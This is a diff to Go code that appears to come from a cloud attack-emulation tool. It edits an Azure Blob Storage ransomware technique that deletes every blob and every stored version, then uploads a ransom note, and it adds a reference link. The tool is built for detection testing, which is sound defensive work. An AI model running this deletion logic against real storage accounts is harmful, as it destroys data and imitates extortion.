@@ -48,7 +48,7 @@ Detonation:
 Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket. 
 
 References:
-#TODO
+(https://www.microsoft.com/en-us/security/blog/2025/10/20/inside-the-attack-chain-threat-activity-targeting-azure-blob-storage/)
 
 `,
 		Detection: `
@@ -96,24 +96,23 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	}
 
 	log.Println("Deleting Blobs...")
-	err = deleteAllBlobVersions(client)
+	err = deleteAllBlobs(client)
 	if err != nil {
 		return fmt.Errorf("unable to delete blobs: %w", err)
 	}
 
-	//Delete again to delete the versioned backups
 	log.Println("Deleting versioned Blob backups...")
-	err = deleteAllBlobVersions(client)
+	err = deleteAllBlobsIncludingVersions(client)
 	if err != nil {
 		return fmt.Errorf("unable to delete blobs: %w", err)
 	}
 
 	log.Println("Uploading ransom note...")
-
 	err = utils.UploadBlob(client, RansomContainerName, RansomNoteFilename, strings.NewReader(RansomNoteContents))
 	if err != nil {
 		return fmt.Errorf("unable to create ransom note: %w", err)
 	}
+
 	log.Println("Technique execution completed")
 	return nil
 }
@@ -140,33 +139,49 @@ func downloadAllBlobs(client *azblob.Client) error {
 	return nil
 }
 
-func deleteAllBlobVersions(client *azblob.Client) error {
+func deleteAllBlobs(client *azblob.Client) error {
+	return deleteBlobsWithFilter(client, false)
+}
+
+func deleteAllBlobsIncludingVersions(client *azblob.Client) error {
+	return deleteBlobsWithFilter(client, true)
+}
+
+func deleteBlobsWithFilter(client *azblob.Client, includeVersions bool) error {
 
 	blobMap, err := utils.ListAllBlobVersions(client)
 	if err != nil {
 		return err
 	}
+	numBlobs, numContainers := getNumBlobs(blobMap)
+	log.Println("Fetched", numBlobs, "blobs across", numContainers, "containers")
+	log.Println("Deleting one by one...")
 	for containerName, versionMap := range blobMap {
 		containerClient := client.ServiceClient().NewContainerClient(containerName)
 
 		log.Println("Iterating over container:", containerName)
 		for blobName, versionIDs := range versionMap {
 			for _, versionID := range versionIDs {
+
 				blobClient := containerClient.NewBlobClient(blobName)
-				if versionID != nil {
-					blobClient, err = blobClient.WithVersionID(*versionID)
-					log.Println("Deleting Blob", blobName, "with version", *versionID)
+				if versionID != nil && includeVersions {
+					var versionedBlobClient *blob.Client
+					versionedBlobClient, err = blobClient.WithVersionID(*versionID)
 					if err != nil {
 						return fmt.Errorf("can't instantiate versioned client for blob %s in container %s: %w", blobName, containerName, err)
 					}
-
+					_, err = versionedBlobClient.Delete(
+						context.Background(),
+						nil,
+				)
+				} else {
+					_, err = blobClient.Delete(
+						context.Background(),
+						&blob.DeleteOptions{
+							DeleteSnapshots: to.Ptr(blob.DeleteSnapshotsOptionTypeInclude),
+						},
+					)
 				}
-				blobClient.Delete(
-					context.Background(),
-					&blob.DeleteOptions{
-						DeleteSnapshots: to.Ptr(blob.DeleteSnapshotsOptionTypeInclude),
-						//	BlobDeleteType: to.Ptr(blob.DeleteTypePermanent), This triggers a 409 error
-					})
 
 				if err != nil {
 					return fmt.Errorf("error when deleting blob %s in container %s: %w", blobName, containerName, err)
@@ -175,4 +190,18 @@ func deleteAllBlobVersions(client *azblob.Client) error {
 		}
 	}
 	return nil
+}
+
+func getNumBlobs(blobMap map[string]map[string][]*string) (int, int) {
+	if blobMap == nil {
+		return 0, 0
+	}
+	total := 0
+	for _, inner := range blobMap {
+		if inner == nil {
+			continue
+		}
+		total += len(inner)
+	}
+	return total, len(blobMap)
 }
